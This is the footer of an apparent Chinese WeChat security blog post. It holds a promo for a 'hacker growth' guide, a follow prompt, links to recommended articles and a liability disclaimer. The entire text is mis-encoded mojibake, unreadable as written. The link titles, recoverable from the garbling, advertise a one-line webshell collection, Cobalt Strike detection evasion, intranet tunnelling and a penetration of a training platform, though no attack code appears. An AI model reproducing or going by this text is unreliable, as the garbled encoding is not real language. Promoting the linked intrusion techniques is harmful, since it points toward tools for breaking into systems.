â€å¯ä»¥é¢†å–ä¸€å¥—é¢†å–é»‘å®¢æˆé•¿ç§˜ç±  
  
![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
Â è¿˜åœ¨ç­‰ä»€ä¹ˆï¼Ÿèµ¶ç´§ç‚¹å‡»ä¸‹æ–¹åç‰‡å…³æ³¨å­¦ä¹ å§ï¼![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
**æ¨èé˜…è¯»**  
  
  
  
[å¹²è´§ï½œå²ä¸Šæœ€å…¨ä¸€å¥è¯æœ¨é©¬](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489259&idx=1&sn=b268701409ad4e8785cd5ebc23176fc8&chksm=c175eb44f60262527120100bd353b3316948928bd7f44cf9b6a49f89d5ffafad88c6f1522226&scene=21#wechat_redirect)  
  
  
  
[å¹²è´§ | CSç»•è¿‡vultrç‰¹å¾æ£€æµ‹ä¿®æ”¹ç®—æ³•](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247486980&idx=1&sn=6d65ae57f03bd32fddb37d7055e5ac8e&chksm=c175f3abf6027abdad06009b2fe964e79f2ca60701ae806b451c18845c656c12b9948670dcbc&scene=21#wechat_redirect)  
  
  
  
[å®æˆ˜Â | ç”¨ä¸­å›½äººå†™çš„çº¢é˜ŸæœåŠ¡å™¨æä¸€æ¬¡å†…ç½‘ç©¿é€ç»ƒä¹ ](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488628&idx=1&sn=ff2c617cccc00fe262ed9610c790fe0e&chksm=c175e9dbf60260cd0e67439304c822d28d510f1e332867e78a07d631ab27143309d14e27e53f&scene=21#wechat_redirect)  
  
  
  
[å®æˆ˜ | æ¸—é€æŸåŸ¹è®­å¹³å°ç»å†](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247488613&idx=1&sn=12884f3d196ac4f5c262a587590d516d&chksm=c175e9caf60260dcc0d5d81a560025d548c61fda975d02237d344fd79adc77ac592e7e562939&scene=21#wechat_redirect)  
  
  
  
[å®æˆ˜ | ä¸€æ¬¡æ›²æŠ˜çš„é’“é±¼æº¯æºååˆ¶](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247489278&idx=1&sn=5347fdbf7bbeb3fd37865e191163763f&chksm=c175eb51f602624777fb84e7928bb4fa45c30f35e27f3d66fc563ed97fa3c16ff06d172b868c&scene=21#wechat_redirect)  
  
  
  
**å…è´£å£°æ˜**  
  
ç”±äºä¼ æ’­ã€åˆ©ç”¨æœ¬å…¬ä¼—å·æ¸—é€å®‰å…¨å›¢é˜Ÿæ‰€æä¾›çš„ä¿¡æ¯è€Œé€ æˆçš„ä»»ä½•ç›´æ¥æˆ–è€…é—´æ¥çš„åæœåŠæŸå¤±ï¼Œå‡ç”±ä½¿ç”¨è€…æœ¬äººè´Ÿè´£ï¼Œå…¬ä¼—å·æ¸—é€å®‰å…¨å›¢é˜ŸåŠä½œè€…ä¸ä¸º**æ­¤**  
æ‰¿æ‹…ä»»ä½•è´£ä»»ï¼Œä¸€æ—¦é€ æˆåæœè¯·è‡ªè¡Œæ‰¿æ‹…ï¼å¦‚æœ‰ä¾µæƒçƒ¦è¯·å‘ŠçŸ¥ï¼Œæˆ‘ä»¬ä¼šç«‹å³åˆ é™¤å¹¶è‡´æ­‰ã€‚è°¢è°¢ï¼  
  
å¥½æ–‡åˆ†äº«æ”¶è—èµä¸€ä¸‹æœ€ç¾ç‚¹åœ¨çœ‹å“¦  
  
